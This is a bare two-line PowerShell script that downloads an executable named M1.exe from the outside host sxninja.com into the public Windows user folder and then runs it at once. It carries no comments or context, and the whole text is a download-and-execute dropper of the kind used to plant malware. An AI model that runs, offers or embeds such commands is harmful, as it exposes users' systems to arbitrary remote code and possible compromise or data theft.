Invoke-WebRequest https://www.sxninja.com/M1.exe -OutFile C:\Users\Public\M1.exe
Start-Process -FilePath "C:\Users\Public\M1.exe"